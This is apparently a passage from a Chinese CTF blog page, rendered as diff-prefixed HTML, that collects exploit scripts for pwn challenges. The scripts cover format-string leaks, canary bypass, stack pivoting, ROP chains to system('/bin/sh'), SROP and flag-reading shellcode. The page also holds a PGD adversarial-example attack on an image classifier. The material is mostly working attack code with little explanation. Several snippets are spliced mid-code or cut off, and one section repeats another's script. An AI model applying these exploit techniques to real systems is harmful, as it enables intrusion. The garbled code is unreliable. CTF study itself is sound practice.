+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #00bcd4">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/heap/" style="color: #ff7d73">heap</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/IoT/" style="color: #ffa2c4">IoT</a>
+        </span>
+        
+    </div>
+    <a href="/2025/08/02/DesCtf/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/08/01/CTF%E6%AF%94%E8%B5%9B%E5%92%8C%E5%A4%8D%E7%8E%B0/">
+        <h2 class="post-title">CTF 比赛和复现</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/CTF/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/8/1
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="FZN-CTF"><a href="#FZN-CTF" class="headerlink" title="FZN CTF"></a>FZN CTF</h1><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>第一道题首先是一个格式化字符串</p>
+<pre><code class="language-python">from pwn import *
+#p = process(&quot;./fmt&quot;)
+p = remote(&quot;&quot;,)
+context.log_level = &#39;debug&#39;
+#gdb.attach(p)
+p.recvuntil(&quot;please input:&quot;)
+p1 = b&#39;%7$s&#39;
+
+p.sendline(p1)
+
+p.interactive()
+</code></pre>
+<p>第二个题是canary</p>
+<pre><code class="language-python">from pwn import *
+
+p = remote(&quot;&quot;, )
+context.log_level = &#39;debug&#39;
+
+p.recvuntil(&quot;Can you guess the number?&quot;)
+
+offset = 0x70 - 0xc
+first_payload = b&#39;a&#39; * offset
+p.sendline(first_payload)
+
+p.recvuntil(b&#39;a&#39; * offset)
+
+canary_bytes = p.recv(4)
+canary_value = u32(canary_bytes) - 0xa
+
+shell_address = 0x8049285
+
+final_payload = b&#39;a&#39; * offset 
+final_payload += p32(canary_value)
+final_payload += b&#39;a&#39; * 0xc
+final_payload += p32(shell_address)
+
+p.sendline(final_payload)
+
+p.interactive()
+</code></pre>
+<p>stack</p>
+<p>栈迁移，需要泄露rbp的地址</p>
+<pre><code class="language-python">from pwn import *
+
+choice = input(&quot;yes is process, no is remote: &quot;)
+
+if &quot;y&quot; in choice:
+    p = process(&quot;./stack_pivotingx64&quot;)
+elif &quot;n&quot; in choice:
+    p = remote(&quot;&quot;, )
+
+context.log_level = &#39;debug&#39;
+
+p.recvuntil(&quot;please give me your name\n&quot;)
+
+first_payload = b&#39;a&#39; * 0x30
+p.send(first_payload)
+
+p.recvuntil(b&#39;a&#39; * 0x30)
+
+leaked_data = p.recv(6)
+rbp_value = u64(leaked_data[-6:].ljust(8, b&#39;\x00&#39;)) - 0x10
+
+rsp_value = rbp_value - 0x30
+binsh_address = rsp_value + 32
+
+print(hex(rbp_value))
+
+pop_rdi_gadget = 0x0000000000401275
+system_function = 0x40126a
+magic_function = 0x401256
+final_payload = p64(0)
+final_payload += p64(pop_rdi_gadget)
+final_payload += p64(binsh_address)
+final_payload += p64(system_function)
+final_payload += b&#39;/bin/sh\x00&#39;
+final_payload += p64(magic_function + 1)
+final_payload += p64(rsp_value)
+final_payload += p64(magic_function)
+
+p.recvuntil(&quot;give me some other message\n&quot;)
+p.send(final_payload)
+p.interactive()
+</code></pre>
+<h2 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h2><p>这个题稍微难一点</p>
+<p>del函数</p>
+<pre><code class="language-c">int del()
+&#123;
+  int v0; // eax
+  void *v1; // rdi
+
+  puts(&quot;idx?&quot;);
+  v0 = get_int();
+  if ( v0  Tensor [0.0, 1.0])
+    transform_to_tensor = transforms.Compose([
+        transforms.ToTensor()
+    ])
+    
+    # 2. 输出转换 (Tensor [0.0, 1.0] -&gt; PIL [0, 255])
+    transform_to_pil = transforms.ToPILImage()
+    
+    print(f&quot;[信息] 模型和转换器准备就绪, 使用设备: &#123;device&#125;&quot;)
+    return model, transform_to_tensor, transform_to_pil, device
+
+# ================================================
+# 阶段二：准备攻击所需数据
+# ================================================
+
+def load_ground_truth_labels():
+    &quot;&quot;&quot;
+    从 data/paths_and_labels.txt 加载所有图片的真实标签。
+    此版本已修复，可以正确处理 string 类型的标签名。
+    &quot;&quot;&quot;
+    label_file = &quot;data/paths_and_labels.txt&quot; #
+    class_indices_file = &quot;data/class_indices.json&quot; #
+    
+    # 确保两个文件都存在
+    assert Path(label_file).exists(), f&quot;文件未找到: &#123;label_file&#125;&quot;
+    assert Path(class_indices_file).exists(), f&quot;文件未找到: &#123;class_indices_file&#125;&quot;
+    
+    # 1. 加载类别名称到索引的映射
+    #    class_indices.json 的格式是 &#123;&quot;0&quot;: &quot;class_name_A&quot;, &quot;1&quot;: &quot;class_name_B&quot;&#125;
+    #    我们需要反转它，变成 &#123;&quot;class_name_A&quot;: 0, &quot;class_name_B&quot;: 1&#125;
+    class_idx_map = json.loads(Path(class_indices_file).read_text(encoding=&#39;utf-8&#39;))
+    name_to_idx_map = &#123;name: int(idx) for idx, name in class_idx_map.items()&#125;
+
+    labels = &#123;&#125;
+    # 使用 &#39;encoding=&#39;utf-8&#39;&#39; 打开文件，防止特殊字符（如日志中的空格）出错
+    with open(label_file, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:
+        for line in f.readlines():
+            line = line.strip()
+            if line:
+                try:
+                    # 2. 修复 line.split()
+                    #    使用 split(None, 1) 来分割，确保只在第一个空格块处分割
+                    #    这可以处理 &#39;data/images/843.png   No_Entry_for_Motor_Vehicles&#39;
+                    path, label_name = line.split(None, 1)
+                    
+                    # 3. 修复 img_id 的解析
+                    #    os.path.basename(path) -&gt; &quot;843.png&quot;
+                    #    .split(&#39;.&#39;)[0] -&gt; &quot;843&quot;
+                    #    int(...) -&gt; 843
+                    img_id = int(os.path.basename(path).split(&#39;.&#39;)[0])
+                    
+                    # 4. 修复标签的解析
+                    #    使用我们创建的映射将 &quot;No_Entry_for_Motor_Vehicles&quot; 转换为 对应的整数
+                    #    使用 .strip() 来移除 label_name 周围可能存在的额外空格
+                    label_index = name_to_idx_map[label_name.strip()]
+                    
+                    labels[img_id] = label_index
+                    
+                except Exception as e:
+                    print(f&quot;解析标签文件出错: &#123;e&#125;, 行: &#39;&#123;line&#125;&#39;&quot;)
+    
+    print(f&quot;[信息] 从 &#39;paths_and_labels.txt&#39; 加载了 &#123;len(labels)&#125; 个真实标签。&quot;)
+    return labels
+
+# ================================================
+# 阶段三：定义并执行攻击
+# ================================================
+
+def run_pgd_attack(model, loss_fn, img_tensor, label_tensor, device, epsilon, alpha, num_steps):
+    &quot;&quot;&quot;
+    对单张图片执行 PGD 攻击。
+    &quot;&quot;&quot;
+    # 克隆原始图像作为攻击的起点
+    adv_img = img_tensor.clone().detach().to(device)
+    
+    # 原始图像张量（用于计算扰动边界）
+    original_img = img_tensor.clone().detach().to(device)
+
+    for _ in range(num_steps):
+        # 1. 启用梯度
+        adv_img.requires_grad = True
+        
+        # 2. 模型正向传播
+        outputs = model(adv_img)
+        
+        # 3. 计算损失（相对于 *真实* 标签）
+        loss = loss_fn(outputs, label_tensor)
+        
+        # 4. 反向传播，计算梯度
+        model.zero_grad()
+        loss.backward()
+        
+        # 5. 获取梯度
+        grad = adv_img.grad.data
+        
+        # 6. PGD 核心：梯度上升（加号），并 .sign()
+        adv_img = adv_img.detach() + alpha * grad.sign()
+        
+        # 7. 约束扰动：确保扰动本身不超过 epsilon (L-infinity 范数)
+        # delta 是总扰动
+        delta = torch.clamp(adv_img - original_img, min=-epsilon, max=epsilon)
+        
+        # 8. 约束图像：将扰动后的图像裁剪回 [0.0, 1.0] 的有效范围
+        adv_img = torch.clamp(original_img + delta, min=0.0, max=1.0)
+
+    return adv_img.detach()
+
+
+def main():
+    # --- 1. 准备工作 ---
+    model, to_tensor, to_pil, device = setup_model_and_transforms()
+    ground_truth_labels = load_ground_truth_labels()
+    
+    # 定义损失函数
+    loss_fn = nn.CrossEntropyLoss()
+
+    # --- 2. 攻击参数 (*** 这是您需要调优的关键 ***) ---
+    
+    # epsilon: 最大扰动幅度。比赛要求扰动尽可能小 [cite: 7]。
+    # 8/255 是一个常用值。您应该尝试更小的值，如 4/255, 2/255
+    epsilon = 8.0 / 255.0  
+    
+    # alpha: 迭代步长
+    alpha = 2.0 / 255.0
+    
+    # num_steps: 迭代次数
+    num_steps = 10
+
+    # --- 3. 循环攻击所有图片 ---
+    
+    input_dir = &quot;data/images&quot;
+    output_dir = &quot;advimages&quot; #
+    os.makedirs(output_dir, exist_ok=True) # 创建输出文件夹 [cite: 9]
+
+    print(f&quot;[信息] 开始攻击... Epsilon=&#123;epsilon:.4f&#125;, Steps=&#123;num_steps&#125;&quot;)
+
+    # 使用 tqdm 创建一个进度条
+    # 循环从 1.png 到 1000.png [cite: 11, 15]
+    for i in tqdm(range(1, 1001), desc=&quot;正在生成对抗样本&quot;):
+        img_name = f&quot;&#123;i&#125;.png&quot; # [cite: 11]
+        img_path = os.path.join(input_dir, img_name)
+        
+        # a. 加载原始图像和标签
+        try:
+            img_pil = Image.open(img_path).convert(&#39;RGB&#39;)
+            true_label = ground_truth_labels[i]
+            
+            img_tensor = to_tensor(img_pil).unsqueeze(0).to(device)
+            label_tensor = torch.tensor([true_label]).to(device)
+        except Exception as e:
+            print(f&quot;无法加载图片 &#123;img_name&#125;: &#123;e&#125;&quot;)
+            continue
+
+        # b. 执行攻击
+        adv_tensor = run_pgd_attack(model, loss_fn, img_tensor, label_tensor, 
+                                    device, epsilon, alpha, num_steps)
+        
+        # c. 转换并保存图像
+        # 移除批次维度 [1, 3, 224, 224] -&gt; [3, 224, 224]
+        adv_tensor_cpu = adv_tensor.squeeze(0).cpu() 
+        # 转换为 PIL Image ( [0.0, 1.0] -&gt; [0, 255] )
+        adv_pil = to_pil(adv_tensor_cpu) 
+        
+        # d. 保存到 advimages 文件夹
+        output_path = os.path.join(output_dir, img_name)
+        adv_pil.save(output_path, format=&quot;PNG&quot;) # [cite: 9]
+
+    print(&quot;=&quot;*50)
+    print(&quot;攻击完成！&quot;)
+    print(f&quot;所有 1000 张对抗样本已保存到 &#39;&#123;output_dir&#125;&#39; 文件夹。&quot;)
+    print(&quot;下一步：将 &#39;advimages&#39; 文件夹压缩为 &#39;advimages_您的队伍名.zip&#39; 并提交。&quot;) # [cite: 16]
+
+if __name__ == &#39;__main__&#39;:
+    main()
+</code></pre>
+<p>我觉得分数应该不是很高。如果有分数限制的话应该过不了。本地调优的方法还没做。在提交之前可以先本地训练生成扰动。因为提交机会只有5次.。有平台以后看一下这个脚本的效果</p>
+<p>这个题目我在网上找了半天没找见，之后看到了再找找。也没搜到官方的类似的答案</p>
+<h1 id="强网拟态"><a href="#强网拟态" class="headerlink" title="强网拟态"></a>强网拟态</h1><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="baby-stack"><a href="#baby-stack" class="headerlink" title="baby_stack"></a>baby_stack</h2><p>应该是签到题。改数字就行。当时就看了一下</p>
+<pre><code class="language-plain">from pwn import *
+
+p = process(&#39;./babystack&#39;)
+# p = remote(&#39;challenge.server.com&#39;, 12345)
+
+target_value = 20150972
+
+# p64(20150972) == b&#39;\x0C\x7C\x33\x01\x00\x00\x00\x00&#39;
+value_bytes = p64(target_value)
+
+padding = b&#39;A&#39; * 248
+
+payload = padding + value_bytes
+
+p.sendlineafter(b&#39;Enter your flag1:&#39;, b&#39;dummy_input&#39;)
+
+print(f&quot;Sending payload: &#123;payload&#125;&quot;)
+p.sendlineafter(b&#39;Enter your flag2:&#39;, payload)
+
+p.interactive()
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1761840143698-afa90392-291d-4f56-ab08-457e2bb09420.png"></p>
+<h2 id="stack-好像叫这个名"><a href="#stack-好像叫这个名" class="headerlink" title="stack(好像叫这个名)"></a>stack(好像叫这个名)</h2><p>第二个stack好像是要retdl。看提示像是。还没开始这个</p>
+<p>看了之后发现情况是我们能打印出来libc的地址</p>
+<p>之后要需要写openat的shellcode</p>
+<pre><code class="language-python">from pwn import *
+import sys
+
+if len(sys.argv) &gt; 1:
+    p = process(&#39;./pwn&#39;)
+else:
+    p = remote(&#39;&#39;, )
+
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+elf = ELF(&#39;./pwn&#39;)
+
+p.send(b&#39;name?&#39;)
+p.send(b&#39;a&#39;*0x10)
+
+p.recvuntil(b&#39;\x7f&#39;)
+stack_leak = u64(p.recv(6).ljust(8, b&#39;\x00&#39;)) - 0x8
+print(hex(stack_leak))
+
+lea_printf = 0x40139B
+main_addr = 0x401418
+
+p.send(b&#39;else?&#39;)
+payload1 = b&#39;a&#39;*0x60 + p64(stack_leak) + p64(lea_printf) + p64(elf.plt[&#39;puts&#39;]) + p64(main_addr)
+p.send(payload1)
+
+p.recvuntil(b&#39;\x7f&#39;)
+libc_leak = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))
+libc_base = libc_leak - 0x62050
+print(hex(libc_base))
+
+ret_gadget = libc_base + libc.search(asm(&quot;ret&quot;)).__next__()
+pop_rdi = libc_base + libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()
+pop_rsi = libc_base + libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()
+pop_rax = libc_base + libc.search(asm(&quot;pop rax\nret&quot;)).__next__()
+pop_rdx_r12 = libc_base + libc.search(asm(&quot;pop rdx\npop r12\nret&quot;)).__next__()
+
+p.send(b&#39;name?&#39;)
+p.send(b&#39;a&#39;*0x10)
+
+p.send(b&#39;else?&#39;)
+payload2 = b&#39;a&#39;*0x68 + p64(pop_rdx_r12) + p64(7) + p64(0) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdi) + p64(stack_leak &amp; -0x1000) + p64(elf.plt[&#39;mprotect&#39;]) + p64(main_addr)
+p.send(payload2)
+
+p.send(b&#39;name?&#39;)
+p.send(b&#39;a&#39;*0x10)
+
+shellcode = asm(&#39;&#39;&#39;
+mov rax, 0x67616c662f
+push rax
+xor rdi, rdi
+sub rdi, 100
+mov rsi, rsp
+xor edx, edx
+xor r10, r10
+push SYS_openat
+pop rax
+syscall
+
+mov rdi, 1
+mov rsi, 3
+push 0
+mov rdx, rsp
+mov r10, 0x100
+push SYS_sendfile
+pop rax
+syscall
+&#39;&#39;&#39;)
+
+p.send(b&#39;else?&#39;)
+payload3 = shellcode.ljust(0x68, b&#39;\x00&#39;) + p64(stack_leak - 0x18)
+p.send(payload3)
+
+p.interactive()
+</code></pre>
+<h2 id="aaaheap"><a href="#aaaheap" class="headerlink" title="aaaheap"></a>aaaheap</h2><p>这个还没有看。先把exp放到这。好像是改堆以后写shellcode</p>
+<pre><code class="language-python">from pwn import *
+context.arch = &#39;aarch64&#39;
+context.log_level = &#39;debug&#39;  # 第一次运行时开启，后面可以关掉
+# p = process([&#39;qemu-aarch64&#39;,&quot;-g&quot;,&#39;1234&#39;,  &#39;-L&#39;, &#39;./lib/&#39;, &#39;./vuln&#39;])
+libc=ELF(&#39;./lib/lib/libc.so.6&#39;)
+# p = process([&#39;qemu-aarch64&#39;,  &#39;-L&#39;, &#39;./lib/&#39;, &#39;./vuln&#39;])
+p = process(&#39;./aaaheap&#39;)
+def cmd(idx):
+    p.sendlineafter(b&#39;Choice: &#39;,str(idx))
+def add(idx,size):
+    cmd(1)
+    p.sendlineafter(b&#39;Index : &#39;,str(idx))
+    p.sendlineafter(b&#39;Size: &#39;,str(size))
+def delete(idx):
+    cmd(2)
+    p.sendlineafter(b&#39;Index: &#39;,str(idx))
+def edit(idx,msg):
+    cmd(3)
+    p.sendlineafter(b&#39;Index: &#39;, str(idx))
+    p.sendafter(b&quot;data:&quot;,msg)
+def show(idx):
+    cmd(4)
+    p.sendlineafter(b&#39;Index: &#39;, str(idx))
+add(0,0x80)
+add(1,0x80)
+add(8,0x80)
+delete(0)
+delete(1)
+show(0)
+p.recvuntil(&quot;Data: &quot;)
+heap=u64(p.recv(5).ljust(8,b&#39;\x00&#39;))&gt;12)
+edit(4,p64(magci)+p64(0))
+add(0,0x38)
+add(6,0x38)
+edit(6,p64(0)*2+p64(heap+0x1d0+0x10))
+
+p.interactive()
+</code></pre>
+<h1 id="newstar2025"><a href="#newstar2025" class="headerlink" title="newstar2025"></a>newstar2025</h1><p>当时做的和复现就放一起了。复现的后面就加括号</p>
+<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><p>第一周的找不见了</p>
+<h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><p>刻在栈里的秘密</p>
+<pre><code class="language-plain">现在有一个密码隐藏在栈上(•̀ᴗ• )
+你需要做的是通过格式化字符串来泄露这个密码o(´^｀)o！m, 告诉我密码我就给你flag
+哦，对了对了，你还要告诉我指向这个密码的地址
+在此之前, 你可以了解一下各个格式化字符串的用法, 例如 %p, %s, %d, 以及 $ 符号. emmm...还有 x86-64 函数调用约定!
+
+指向密码的指针被存放在了 0x7fffb3af6fc0 中, 同时栈顶指针是 0x7fffb3af6f40 .
+他们之间的距离是:也就是说, 在printf之前, 格式字符串的参数看起来就像 ( *・ω・)
+
+0x7fffb3af6fc0: [?]  &#39;)
+    io.sendline(b&#39;2&#39;)
+    io.recvuntil(b&#39;Which number?&#39;)
+    io.recvuntil(b&#39;&gt; &#39;)
+    io.sendline(str(index))
+    io.recvuntil(b&#39;Change to what?&#39;)
+    io.recvuntil(b&#39;&gt; &#39;)
+    io.sendline(str(number))
+
+def csu(rbx, rbp, r12, r13, r14, r15, last):
+    # pop rbx,rbp,r12,r13,r14,r15
+    # rbx should be 0,
+    # rbp should be 1,enable not to jump
+    # r12 should be the function we want to call
+    # rdi=edi=r15d
+    # rsi=r14
+    # rdx=r13
+    payload = &#39;a&#39; * 0x80 + fakeebp
+    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
+    payload += p64(csu_front_addr)
+    payload += &#39;a&#39; * 0x38
+    payload += p64(last)
+    sh.send(payload)
+    sleep(1)
+
+main_addr=0x00000000004010B4
+
+pop_rdi_ret_addr=0x0000000000401253
+pop_rsi_r15_ret_addr=0x0000000000401251 
+edit_addr=0x0000000000400A5A
+ret_addr=0x00000000004006b6
+###
+add(1,0) #rbx=0
+add(2,1) #rbp=1
+add(3,write_got) #r12
+add(4,1) #r13=edi
+add(5,write_got) #r14
+add(6,8) #r15
+add(7,0x0000000000401230)#csu_font
+add(8,1)
+add(9,1)
+add(10,1)
+add(11,1)
+add(12,1)
+add(13,1)
+add(14,1)
+add(15,main_addr) #main
+add(0,0x000000000040124A) #csu_end
+
+
+leak =u64(io.recv(8))
+print(&quot;leak:&quot;,hex(leak))
+
+ONE=[0x4f2a5,0x4f302,0x10a2fc]
+libc=ELF(&quot;./libc.so.6&quot;)
+free_offset=libc.symbols[&quot;write&quot;]
+libc_base=leak-free_offset
+system_offset=libc.symbols[&#39;system&#39;]
+system_addr=libc_base+system_offset
+binsh_addr=libc_base+next(libc.search(b&quot;/bin/sh&quot;))
+
+add(1,binsh_addr)
+add(2,ret_addr)
+add(3,system_addr)
+add(0,pop_rdi_ret_addr)
+io.interactive()
+</code></pre>
+<h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h3><pre><code class="language-python">from pwn import *
+import sys
+
+filename = &quot;./calc&quot;
+libc_name = &quot;./libc.so.6&quot;
+arch = &#39;amd64&#39;
+
+context(log_level=&quot;debug&quot;, os=&quot;linux&quot;, arch=arch)
+
+# 默认使用本地模式
+io = process(filename)
+
+elf = ELF(filename)
+libc = ELF(libc_name)
+
+def cmd(val):
+    io.sendlineafter(b&quot;&gt; &quot;, str(val).encode())
+
+def edit(idx, val):
+    cmd(2)
+    cmd(idx)
+    cmd(val)
+
+def show_numbers():
+    cmd(1)
+
+def calc(type, num1, num2, result):
+    cmd(type)
+    cmd(num1)
+    cmd(num2)
+    cmd(result)
+
+jmp_back_while = 0x1cda
+pop_rdi_ret = 0x1d11
+main_addr = 0x1be5
+
+edit(15, jmp_back_while)
+edit(1, elf.got[&#39;puts&#39;])
+print(f&quot;puts_got--&gt;&#123;hex(elf.got[&#39;puts&#39;])&#125;&quot;)
+edit(2, elf.plt[&#39;puts&#39;])
+edit(3, main_addr)
+edit(4, pop_rdi_ret)
+
+cmd(4)
+calc(1, 0, 16, 16)
+calc(2, 16, 15, 16)
+calc(1, 1, 16, 1)
+calc(1, 2, 16, 2)
+calc(1, 3, 16, 3)
+calc(1, 4, 16, 0)
+cmd(6) 
+
+leak_addr = u64(io.recvuntil(b&quot;\n&quot;, drop=True).ljust(8, b&quot;\x00&quot;))
+print(f&quot;leaked libc addr!!--&gt;&#123;leak_addr:#x&#125;&quot;)
+
+libc_base = leak_addr - libc.sym[&#39;puts&#39;]
+system_addr = libc_base + libc.sym[&#39;system&#39;]
+binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh\x00&quot;))
+ret_addr = libc_base + 0x29139
+pop_rdi_ret = libc_base + 0x2a3e5
+
+edit(1, binsh_addr)
+edit(2, ret_addr)
+edit(3, system_addr)
+edit(0, pop_rdi_ret)
+
+io.interactive()
+</code></pre>
+<h3 id="only-read"><a href="#only-read" class="headerlink" title="only_read"></a>only_read</h3><pre><code class="language-python">from pwn import *
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;info&#39;)
+
+remote_addr = &quot;&quot;
+remote_port = 
+filename = &quot;./pwn&quot;
+
+bss = 0x404100
+gift_addr = 0x401366
+syscall_ret_addr = 0x40136D
+vuln_addr = 0x401342
+pop_rbp_ret = 0x40118D
+
+def exploit():
+    io = remote(remote_addr, remote_port)
+
+    payload1 = flat(
+        b&#39;a&#39; * 0x10,
+        bss + 0x200,
+        vuln_addr
+    )
+    io.sendline(payload1)
+    sleep(0.5)
+
+    frame1 = SigreturnFrame()
+    frame1.rax = 0
+    frame1.rdi = 0
+    frame1.rsi = bss + 0x200
+    frame1.rdx = 0x500
+    frame1.rip = syscall_ret_addr
+    frame1.rsp = bss + 0x200
+
+    payload2 = flat(
+        b&#39;a&#39; * 0x18,
+        gift_addr
+    ) + bytes(frame1)[:-0x18]
+
+    io.send(payload2)
+    sleep(0.5)
+
+    frame2 = SigreturnFrame()
+    frame2.rax = 10
+    frame2.rdi = 0x404000
+    frame2.rsi = 0x1000
+    frame2.rdx = 7
+    frame2.rip = syscall_ret_addr
+    frame2.rsp = bss + 0x200 + 256
+
+    shellcode = asm(&#39;&#39;&#39;
+        mov rax, 0x67616c662f
+        push rax
+        mov rdi, rsp
+        xor rsi, rsi
+        xor rdx, rdx
+        mov rax, 2
+        syscall
+        
+        mov rdi, rax
+        mov rsi, rsp
+        mov rdx, 0x100
+        xor rax, rax
+        syscall
+        
+        mov rdx, rax
+        mov rsi, rsp
+        mov rdi, 1
+        mov rax, 1
+        syscall
+        
+        mov rax, 60
+        xor rdi, rdi
+        syscall
+    &#39;&#39;&#39;)
+
+    log.info(f&quot;Shellcode length: &#123;len(shellcode)&#125;&quot;)
+
+    frame3 = SigreturnFrame()
+    frame3.rip = bss + 0x200 + 512
+    frame3.rsp = bss
+
+    payload3 = p64(gift_addr) + bytes(frame2) + p64(gift_addr) + bytes(frame3) + shellcode
+
+    io.send(payload3)
+    io.interactive()
+
+if __name__ == &#39;__main__&#39;:
+    exploit()
+</code></pre>
+<h3 id="sand-box-plus"><a href="#sand-box-plus" class="headerlink" title="sand_box_plus"></a>sand_box_plus</h3><pre><code class="language-python">from pwn import *
+import sys
+
+filename = &quot;./sandbox_plus&quot;
+libc_name = &quot;./libc.so.6&quot;
+arch = &#39;amd64&#39;
+remote_addr = &quot;&quot;
+remote_port = 
+
+context(log_level=&quot;debug&quot;, os=&quot;linux&quot;, arch=arch)
+
+# 默认使用远程模式
+io = remote(remote_addr, remote_port)
+
+# 如果需要本地测试，注释掉上面一行，
+# 然后取消下面一行的注释
+# io = process(filename)
+
+# 如果需要gdb调试，
+# io = process(filename)
+# gdb.attach(io, gdbscript=&#39;&#39;&#39;
+# b *main+116
+# c
+# si 10
+# &#39;&#39;&#39;)
+
+elf = ELF(filename)
+# libc = ELF(libc_name)
+
+shellcode_addr = 0x114514
+
+shellcode = &quot;&quot;&quot;
+ /* openat(0, &quot;/flag&quot;, 0, 0) */
+ mov rbx, 0x67616c662f
+ push rbx
+ push rsp
+ pop rsi
+ xor edi, edi
+ xor r10, r10
+ xor edx, edx
+ push 0x101
+ pop rax
+ syscall
+ mov rbx, rax
+
+ /* pread64(fd, buf, 0x100, 0) */
+ sub rsp, 0x100
+ mov rdi, rbx
+ mov rsi, 0x114514
+ mov rdx, 0x100
+ xor r10, r10
+ mov eax, 17
+ syscall
+ add rsp, 0x100
+
+ /* writev(1, &amp;[0x114514, rax], 1) */
+ push 1
+ pop rdi
+ push 0x1
+ pop rdx
+ push rax
+ push rsi
+ mov rsi, rsp
+ push 0x14
+ pop rax
+ syscall
+&quot;&quot;&quot;
+
+assembled_shellcode = asm(shellcode)
+
+print(f&quot;shellcode length=&#123;len(assembled_shellcode)&#125;&quot;)
+
+io.sendafter(b&quot;orw_plus function (also also after compile)\n&quot;,
+             assembled_shellcode)
+
+io.interactive()
+</code></pre>
+<p>和calc脚本一样，运行的时候要用到那个命令</p>
+<h2 id="fmt-canary"><a href="#fmt-canary" class="headerlink" title="fmt_canary"></a>fmt_canary</h2><pre><code class="language-python">from pwn import *
+import sys
+
+filename = &quot;./sandbox_plus&quot;
+libc_name = &quot;./libc.so.6&quot;
+arch = &#39;amd64&#39;
+remote_addr = &quot;&quot;
+remote_port = 
+
+context(log_level=&quot;debug&quot;, os=&quot;linux&quot;, arch=arch)
+
+# 默认使用远程模式
+io = remote(remote_addr, remote_port)
+
+# 如果需要本地测试，注释掉上面一行，
+# 然后取消下面一行的注释
+# io = process(filename)
+
+# 如果需要gdb调试，
+# io = process(filename)
+# gdb.attach(io, gdbscript=&#39;&#39;&#39;
+# b *main+116
+# c
+# si 10
+# &#39;&#39;&#39;)
+
+elf = ELF(filename)
+# libc = ELF(libc_name)
+
+shellcode_addr = 0x114514
+
+shellcode = &quot;&quot;&quot;
+ /* openat(0, &quot;/flag&quot;, 0, 0) */
+ mov rbx, 0x67616c662f
+ push rbx
+ push rsp
+ pop rsi
+ xor edi, edi
+ xor r10, r10
+ xor edx, edx
+ push 0x101
+ pop rax
+ syscall
+ mov rbx, rax
+
+ /* pread64(fd, buf, 0x100, 0) */
+ sub rsp, 0x100
+ mov rdi, rbx
+ mov rsi, 0x114514
+ mov rdx, 0x100
+ xor r10, r10
+ mov eax, 17
+ syscall
+ add rsp, 0x100
+
+ /* writev(1, &amp;[0x114514, rax], 1) */
+ push 1
+ pop rdi
+ push 0x1
+ pop rdx
+ push rax
+ push rsi
+ mov rsi, rsp
+ push 0x14
+ pop rax
+ syscall
+&quot;&quot;&quot;
+
+assembled_shellcode = asm(shellcode)
+
+print(f&quot;shellcode length=&#123;len(assembled_shellcode)&#125;&quot;)
+
+io.sendafter(b&quot;orw_plus function (also also after compile)\n&quot;,
+             assembled_shellcode)
+
+io.interactive()
+</code></pre>
+<h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="fmt-1"><a href="#fmt-1" class="headerlink" title="fmt"></a>fmt</h3><pre><code class="language-python">from pwn import *
+context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&#39;debug&#39;)
+io = process(&quot;fmt_got&quot;)
+io=remote(&#39;&#39;,)
+elf=ELF(&quot;./fmt_got&quot;)
+exit_got=elf.got[&#39;exit&#39;]
+readflag_addr=0x0000000000401236
+
+payload=b&#39;%4628c&#39;+b&#39;%12$hn&#39;+b&#39;aa&#39;+p64(exit_got)
+io.recvuntil(b&#39;&gt;&#39;)
+io.sendline(payload)
+#io.recvall(timeout=5)
+io.interactive()
+</code></pre>
+<h3 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h3><pre><code class="language-python">from pwn import *
+
+context(arch=&quot;amd64&quot;, os=&quot;linux&quot;, log_level=&#39;debug&#39;)
+io=process(&quot;memory&quot;)
+io = remote(&#39;&#39;, ) 
+elf = ELF(&quot;memory&quot;)
+bss=elf.bss()+0x200
+
+io.recvuntil(&quot;&gt; &quot;)
+payload = asm(f&#39;&#39;&#39;
+lea rsi, [rip + 0x100]  /* 先加一个大偏移 */
+  sub rsi, 0x138         /* 再减去更多，达到-0x40的效果 */
+  xor eax, eax
+  mov al, 1
+  xor edi, edi
+  mov dil, 1
+  mov edx, 100
+  syscall
+&#39;&#39;&#39;)
+#gdb.attach(io)
+#pause()
+io.sendline(payload)
+io.interactive()
+</code></pre>
+<h3 id="desert"><a href="#desert" class="headerlink" title="desert"></a>desert</h3><pre><code class="language-python">from pwn import *
+import ctypes
+import tempfile
+import os
+context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&#39;debug&#39;)
+io = process(&quot;desert&quot;)
+io=remote(&#39;&#39;,)
+elf=ELF(&quot;./desert&quot;)
+read_addr=0x00000000004014A4
+have_a_rest=0x0000000000401466
+city_addr=elf.sym[&#39;city&#39;]
+main_addr=elf.sym[&#39;main&#39;]
+
+data = io.recvuntil(b&#39;&gt;&gt; &#39;)
+print(data)
+io.sendline(str(2))
